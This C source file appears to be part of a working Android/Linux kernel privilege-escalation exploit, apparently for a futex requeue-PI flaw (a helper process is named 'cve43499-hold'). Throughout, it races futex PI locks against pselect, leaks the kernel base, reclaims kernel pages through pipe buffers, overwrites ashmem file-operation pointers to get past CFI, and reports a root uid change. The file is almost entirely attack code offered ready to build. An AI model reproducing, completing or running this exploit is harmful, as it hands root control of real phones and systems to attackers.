#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int waiter_wait_ret;
atomic_int waiter_wait_errno;
atomic_int main_requeue_ret;
atomic_int main_requeue_errno;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_ready;
atomic_int consumer_seen_seq;
atomic_int consumer_wake_ret;
atomic_int consumer_wake_errno;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_last_errno;
atomic_int consumer_last_ret;
atomic_int consumer_last_tid;
atomic_int consumer_last_nice;
atomic_int consumer_nice_before;
atomic_int consumer_nice_after;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int pipe_prepare_status;
int memfd_leak;

#if defined(FOPS_SYNC_PSELECT_SYSCALL) && FOPS_SYNC_PSELECT_SYSCALL
static long read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int read_task_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int task_blocked_in_pselect(int tid, long *syscall_nr,
                                   char *wchan, size_t size) {
  *syscall_nr = read_task_syscall_nr(tid);
  if (*syscall_nr != SYS_pselect6 || !read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int wait_for_pselect_blocked(int tid, size_t timeout_usec,
                                    int confirmations, size_t *elapsed_usec,
                                    long *last_syscall, char *last_wchan,
                                    size_t last_wchan_size) {
  struct timespec clock_now;
  if (clock_gettime(CLOCK_MONOTONIC, &clock_now) != 0) {
    return 0;
  }
  size_t started =
      (size_t)clock_now.tv_sec * 1000000000ULL + clock_now.tv_nsec;
  size_t deadline = started + timeout_usec * 1000ULL;
  int synced = 0;
  size_t current = started;
  while (current < deadline) {
    if (task_blocked_in_pselect(tid, last_syscall, last_wchan,
                                last_wchan_size)) {
      synced++;
      if (synced >= confirmations) {
        break;
      }
      usleep(100);
    } else {
      synced = 0;
      __asm__ volatile("yield" ::: "memory");
    }
    if (clock_gettime(CLOCK_MONOTONIC, &clock_now) != 0) {
      return 0;
    }
    current = (size_t)clock_now.tv_sec * 1000000000ULL + clock_now.tv_nsec;
  }
  *elapsed_usec = (current - started) / 1000ULL;
  return synced >= confirmations;
}
#endif

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_warning("waiter lock chain failed errno=%d; refusing PI route\n", errno);
    atomic_store(&waiter_ready, -1);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (atomic_load(&owner_started) <= 0) {
    usleep(1000);
  }

  struct timespec timeout;
  if (clock_gettime(CLOCK_MONOTONIC, &timeout) != 0) {
    pr_warning("waiter route clock failed errno=%d; using relative fallback\n",
               errno);
    timeout.tv_sec = 0;
    timeout.tv_nsec = 0;
  }
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &f_pi_target, 0);
  atomic_store(&waiter_wait_ret, (int)wait_ret);
  atomic_store(&waiter_wait_errno, errno);

  do_pselect_fake_lock_route();

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  atomic_store(&route_done, 1);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_warning("owner lock target failed errno=%d; retaining route threads "
               "until reboot\n",
               errno);
    mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
    atomic_store(&owner_started, -1);
    for (;;) {
      sleep(60);
    }
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(CONSUMER_CORE, &cpuset);
  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
    pr_warning("pselect consumer affinity failed core=%d errno=%d\n",
               CONSUMER_CORE, errno);
    atomic_store(&consumer_ready, -1);
    return NULL;
  }

  int seen = 0;
  pr_info("pselect consumer ready worker_tid=%d core=%d\n",
          (int)syscall(SYS_gettid), CONSUMER_CORE);
  fflush(NULL);
  atomic_store(&consumer_ready, 1);

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      futex_op((uint32_t *)&punch_consume_go, FUTEX_WAIT_PRIVATE,
               (uint32_t)seq, NULL, NULL, 0);
      continue;
    }

    seen = seq;
    atomic_store(&consumer_seen_seq, seq);
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    int delay_usec = atomic_load(&main_route_delay_usec);
    if (delay_usec > 0) {
      usleep((useconds_t)delay_usec);
    }

#if defined(FOPS_SYNC_PSELECT_SYSCALL) && FOPS_SYNC_PSELECT_SYSCALL
    size_t sync_elapsed_usec = 0;
    long sync_syscall = -1;
    char sync_wchan[64] = "<not-read>";
    int sync_ok = wait_for_pselect_blocked(
        tid, FOPS_PSELECT_SYNC_TIMEOUT_USEC,
        FOPS_PSELECT_SYNC_CONFIRMATIONS, &sync_elapsed_usec,
        &sync_syscall, sync_wchan, sizeof(sync_wchan));
    pr_info("pselect consumer guard seq=%d ready=%d elapsed_us=%zu "
            "syscall=%ld expected=%d wchan=%s\n",
            seq, sync_ok, sync_elapsed_usec, sync_syscall,
            SYS_pselect6, sync_wchan);
    fflush(NULL);
    if (!sync_ok) {
      atomic_store(&consumer_last_tid, tid);
      atomic_store(&consumer_last_nice, -1);
      atomic_store(&consumer_last_ret, -1);
      atomic_store(&consumer_last_errno, EAGAIN);
      atomic_store(&punch_consume_go, 0);
      continue;
    }
#endif

    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      errno = 0;
      int nice_before = getpriority(PRIO_PROCESS, tid);
      int nice_before_errno = errno;
      atomic_store(&consumer_nice_before,
                   nice_before_errno == 0 ? nice_before : -99);
      errno = 0;
      int nice_value = PSELECT_CONSUMER_NICE_FIRST + seq - 1;
      if (nice_value > PSELECT_CONSUMER_NICE) {
        nice_value = PSELECT_CONSUMER_NICE;
      }
      long sched_ret = sched_setattr_tid(tid, nice_value);
      int sched_errno = errno;
      errno = 0;
      int nice_after = getpriority(PRIO_PROCESS, tid);
      int nice_after_errno = errno;
      atomic_store(&consumer_nice_after,
                   nice_after_errno == 0 ? nice_after : -99);
      atomic_store(&consumer_last_tid, tid);
      atomic_store(&consumer_last_nice, nice_value);
      atomic_store(&consumer_last_ret, (int)sched_ret);
      atomic_store(&consumer_last_errno, sched_errno);
      atomic_fetch_add(&consumer_calls, 1);
      if (sched_ret == 0) {
        atomic_fetch_add(&consumer_success, 1);
      }
      calls_this_seq++;
      if (calls_this_seq >= CONSUMER_MAX_CALLS) {
        atomic_store(&punch_consume_go, 0);
        break;
      }
      __asm__ volatile("yield" ::: "memory");
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&waiter_wait_ret, -99);
  atomic_store(&waiter_wait_errno, 0);
  atomic_store(&main_requeue_ret, -99);
  atomic_store(&main_requeue_errno, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_ready, 0);
  atomic_store(&consumer_seen_seq, 0);
  atomic_store(&consumer_wake_ret, -99);
  atomic_store(&consumer_wake_errno, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_last_errno, 0);
  atomic_store(&consumer_last_ret, 0);
  atomic_store(&consumer_last_tid, 0);
  atomic_store(&consumer_last_nice, -1);
  atomic_store(&consumer_nice_before, -99);
  atomic_store(&consumer_nice_after, -99);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&pipe_prepare_status, PIPE_PREPARE_IDLE);
  atomic_store(&cfi_safe_hold_required, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  int create_rc = pthread_create(&consumer, NULL, consumer_thread, NULL);
  if (create_rc != 0) {
    pr_warning("pselect consumer thread create failed rc=%d\n", create_rc);
    return;
  }
  while (atomic_load(&consumer_ready) == 0) {
    usleep(1000);
  }
  if (atomic_load(&consumer_ready) < 0) {
    pr_warning("pselect consumer initialization failed; refusing PI route\n");
    return;
  }

  create_rc = pthread_create(&waiter, NULL, waiter_thread, NULL);
  if (create_rc != 0) {
    pr_warning("pselect waiter thread create failed rc=%d\n", create_rc);
    return;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }
  if (atomic_load(&waiter_ready) < 0) {
    pr_warning("pselect waiter initialization failed; refusing PI route\n");
    return;
  }

  create_rc = pthread_create(&owner, NULL, owner_thread, NULL);
  if (create_rc != 0) {
    pr_warning("pselect owner thread create failed rc=%d; reboot required to "
               "terminate the waiting route thread safely\n",
               create_rc);
    mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
    for (;;) {
      sleep(60);
    }
  }

  for (;;) {
    int owner_state = atomic_load(&owner_started);
    if (owner_state < 0) {
      pr_warning("pselect owner initialization failed; reboot required\n");
      for (;;) {
        sleep(60);
      }
    }
    if (owner_state > 0 && atomic_load(&waiter_waiting)) {
      break;
    }
    usleep(1000);
  }

  pr_info("main route threads ready waiter_tid=%d consumer_ready=%d\n",
          atomic_load(&waiter_tid), atomic_load(&consumer_ready));
  fflush(NULL);

  usleep(100000);
  errno = 0;
  long requeue_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                              &f_pi_target, 0);
  atomic_store(&main_requeue_ret, (int)requeue_ret);
  atomic_store(&main_requeue_errno, errno);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }

  pr_info("pi route cleanup complete route_done=%d owner_chain_done=%d "
          "waiter_wait=%d/%d prepare_status=%d\n",
          atomic_load(&route_done), atomic_load(&owner_chain_done),
          atomic_load(&waiter_wait_ret), atomic_load(&waiter_wait_errno),
          atomic_load(&pipe_prepare_status));
  fflush(NULL);

  if (atomic_load(&cfi_safe_hold_required)) {
    mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
    pr_warning("cfi stable-page hold active after PI cleanup; reboot the "
               "device before terminating this process\n");
    fflush(NULL);
    for (;;) {
      sleep(1);
    }
  }
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
static int fops_data_alias_deferred;
static uintptr_t fops_data_alias_deferred_target;
static uint64_t fops_data_alias_deferred_initial;

static int verify_fops_data_alias_before_production(void) {
  uintptr_t saved_gate_page = p0_gate_page_struct;
  uintptr_t saved_probe_page = p0_probe_page_struct;
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
  uintptr_t aliases[] = {
    data_addr(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"probe-derived"};
#else
  uintptr_t aliases[] = {
    p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset,
    p0_data_alias(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"with-slide", "without-slide"};
#endif
  uint64_t expected = text_addr(ASHMEM_FOPS);
  int verified = 0;
  int abort_verification = 0;

  for (size_t index = 0; index < sizeof(aliases) / sizeof(aliases[0]);
       index++) {
    int fresh_attempt = 1;
    int search_batch = 0;
#ifdef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
    const int max_search_batches = APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES;
#else
    const int max_search_batches = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#endif
    int prepare_oracle = 1;
    while (fresh_attempt <= APP_FOPS_FRESH_PAGE_ATTEMPTS &&
           search_batch < max_search_batches) {
      fops_data_probe_addr = aliases[index];
      fops_data_probe_active = 1;
      if (prepare_oracle) {
        reset_pipe_attempt();
        if (!prepare_p0_pipe_oracle()) {
          pr_error("fops data alias pipe preparation failed candidate=%s\n",
                   names[index]);
          abort_verification = 1;
          break;
        }
        prepare_oracle = 0;
      }
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      search_batch++;
      pr_info("fops data alias search candidate=%s batch=%d/%d "
              "gate_attempt=%d/%d base=%016zx\n",
              names[index], search_batch, max_search_batches,
              fresh_attempt, APP_FOPS_FRESH_PAGE_ATTEMPTS, page_base);
      if (!page_base) {
        pr_warning("fops data alias page unavailable candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
#ifndef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
        fresh_attempt++;
        prepare_oracle = 1;
#endif
        continue;
      }

      int gate_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
      int gate_result = gate_triggered
          ? verify_p0_pipe_oracle_gate()
          : 0;
      pr_info("fops data alias gate candidate=%s fresh=%d/%d "
              "triggered=%d result=%d page=%016zx\n",
              names[index], fresh_attempt,
              APP_FOPS_FRESH_PAGE_ATTEMPTS, gate_triggered,
              gate_result, page_base);
      if (gate_result == 0) {
        pr_warning("fops data alias reclaim miss candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
        fresh_attempt++;
        prepare_oracle = 1;
        continue;
      }

      app_publish_p0_dirty();
      if (gate_result < 0) {
        pr_error("fops data alias gate changed unexpected pages "
                 "candidate=%s\n", names[index]);
        app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
        abort_verification = 1;
        break;
      }

      int alias_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      /*
       * Keep the redirected pipe_buffer queued across production slot 4.
       * Reading it now would only reconfirm the pre-write ashmem_fops value;
       * reading it after slot 4 directly measures the target word and avoids
       * treating the ashmem/configfs CFI route as a memory-read oracle.
       */
      int result = alias_triggered ? 1 : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      if (alias_triggered && gate_restored) {
        fops_data_alias_deferred = 1;
        fops_data_alias_deferred_target = fops_data_probe_addr;
        fops_data_alias_deferred_initial = expected;
      }
      pr_info("fops data alias deferred candidate=%s address=%016zx "
              "initial=%016llx gate=%d triggered=%d armed=%d "
              "gate_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, fops_data_alias_deferred,
              gate_restored, page_base);
#else
      int result = alias_triggered
          ? verify_p0_pipe_data_page(fops_data_probe_addr, expected)
          : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      int alias_restored = alias_triggered
          ? app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT)
          : 0;
      pr_info("fops data alias candidate=%s address=%016zx "
              "expected=%016llx gate=%d triggered=%d result=%d "
              "gate_restored=%d alias_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, result, gate_restored,
              alias_restored, page_base);
#endif
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      if (!gate_restored || !alias_triggered ||
          !fops_data_alias_deferred) {
        pr_error("fops data alias deferred arm failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1) {
        verified = 1;
      }
#else
      if (!gate_restored || (alias_triggered && !alias_restored)) {
        pr_error("fops data alias restore failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1 && alias_triggered && alias_restored) {
#if !defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) || \
    !APP_P0_FINGERPRINT_INVERSE_SLIDE
        data_alias_uses_slide = index == 0;
#endif
        verified = 1;
      }
#endif
      break;
    }
    if (verified || abort_verification) {
      break;
    }
  }

  p0_gate_page_struct = saved_gate_page;
  p0_probe_page_struct = saved_probe_page;
  fops_data_probe_active = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  if (verified) {
    pr_info("fops data alias retaining verified payload page=%016zx "
            "pipe_page=%016zx production_slot=%d\n",
            page_base, pipebuf_page_base, P0_ORACLE_PRODUCTION_SLOT);
  } else {
    reset_pipe_attempt();
  }
#else
  reset_pipe_attempt();
#endif
  pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
          "uses_slide=%d\n",
          verified, slide_p0_offset, data_alias_uses_slide);
  return verified;
}
#endif

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (!slide_p0_session_fresh) {
    pr_error("full route requires P0 discovery in the current exploit process; "
             "refusing forced or retained cross-process slide\n");
    return 1;
  }
#endif

#if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
  if (!verify_fops_data_alias_before_production()) {
    pr_error("fops data alias verification failed; production skipped\n");
    return 1;
  }
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
          page_base, pipebuf_page_base);
  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#else
  reset_pipe_attempt();
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  if (!prepare_p0_pipe_oracle()) {
    pr_error("fops oracle pipe preparation failed\n");
    return 1;
  }
  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
#else
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#endif
#endif
#endif

  pin_to_core(CORE);
#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
    !APP_FOPS_REUSE_VERIFIED_PAGE
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
#endif

  /* Never enter pselect/CFI with a null page — that freezes/panics the box. */
  if (!page_base) {
    pr_error("kernel page prepare failed (base=0); aborting before pselect\n");
    return 1;
  }

  pr_success("kernel page ready base=%016zx lock=%016zx w0=%016zx task=%016zx "
             "fops=%016zx pipe_page=%016zx\n",
             page_base, fake_lock, fake_w0, fake_task, fake_fops,
             pipebuf_page_base);
  fflush(NULL);

  /*
   * Safe checkpoint: prove mm leak + skb reclaim without entering pselect.
   *   RMG_STOP_AFTER_PREPARE=1 LD_PRELOAD=... sleep 30
   */
  if (getenv("RMG_STOP_AFTER_PREPARE") &&
      strcmp(getenv("RMG_STOP_AFTER_PREPARE"), "0") != 0) {
    pr_success("RMG_STOP_AFTER_PREPARE set — skipping pselect/CFI/root "
               "(leak+reclaim checkpoint ok)\n");
    fflush(NULL);
    return 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!page_base) {
    return 1;
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
    if (pipe_prepare_child > 0) {
      SYSCHK(kill(pipe_prepare_child, SIGKILL));
      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
      pipe_prepare_child = -1;
    }
    return 2;
  }
  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
#endif
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  int fops_oracle_triggered =
      app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
  int fops_oracle_gate =
      fops_oracle_triggered ? verify_p0_pipe_oracle_gate() : 0;
  int fops_oracle_restored = 0;
  if (fops_oracle_gate != 0) {
    app_publish_p0_dirty();
    fops_oracle_restored =
        app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
  }
  pr_info("fops-oracle-diag triggered=%d gate=%d restored=%d "
          "page=%016zx object_min=%d delay=%d; stopping before misc_fops\n",
          fops_oracle_triggered, fops_oracle_gate, fops_oracle_restored,
          page_base, APP_FOPS_MIN_OBJECT_INDEX,
          APP_FOPS_PSELECT_DELAY_USEC);
  return 1;
#else
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  const int fops_fresh_page_attempts = 1;
#else
#ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
  const int fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#else
  const int fops_fresh_page_attempts = 1;
#endif
#endif
  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base) {
        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
                   attempt, fops_fresh_page_attempts);
        continue;
      }
    }
    int triggered = app_trigger_fops_slide_route();
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
#endif
    int verified = 0;
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
    int postwrite_result = 0;
    int probe_restored = 0;
    if (fops_data_alias_deferred) {
      postwrite_result = verify_p0_pipe_data_page(
          fops_data_alias_deferred_target, fake_fops);
      probe_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
      pr_info("fops postwrite direct read target=%016zx initial=%016llx "
              "want=%016zx result=%d probe_restored=%d triggered=%d\n",
              fops_data_alias_deferred_target,
              (unsigned long long)fops_data_alias_deferred_initial,
              fake_fops, postwrite_result, probe_restored, triggered);
#if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
    APP_FOPS_DURABLE_POSTWRITE_LOG
      /* Preserve the authoritative result even if RDB dies before
       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
       * returns EINVAL: that is not a failure worth aborting for. */
      fflush(NULL);
      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
        pr_warning("fsync stdout errno=%d\n", errno);
      }
#endif
      fops_data_alias_deferred = 0;
    }
    if (triggered && postwrite_result == 1 && probe_restored) {
      verified = try_cfi_stage();
    } else {
      cfi_last_step = 35;
      cfi_last_errno = 0;
    }
#else
    verified = triggered && try_cfi_stage();
#endif
    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, fops_fresh_page_attempts, triggered, verified,
            cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
    pr_info("app fops clean miss; releasing reclaim state before fresh "
            "page attempt=%d/%d\n",
            attempt, fops_fresh_page_attempts);
  }
#else
  for (int attempt = 1; attempt <= 1; attempt++) {
    int triggered = app_trigger_fops_slide_route();
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
    int verified = triggered && try_cfi_stage();
    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
  }
#endif
#endif
#else
  pr_info("entering standalone pselect route base=%016zx lock=%016zx fops=%016zx "
          "init_task=%016zx ashmem_misc=%016zx phys=%016llx load=%016llx\n",
          page_base, fake_lock, fake_fops, text_addr(INIT_TASK),
          data_addr(ASHMEM_MISC_FOPS), (unsigned long long)P0_PHYS_OFFSET,
          (unsigned long long)P0_KERNEL_PHYS_LOAD);
  fflush(NULL);
  run_main_route_threads();
  pr_info("returned from standalone pselect route cfi_done=%d root=%d\n",
          atomic_load(&cfi_stage_done), root_child_done);
  fflush(NULL);
#endif

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
  return exploit_ok ? 0 : 1;
}
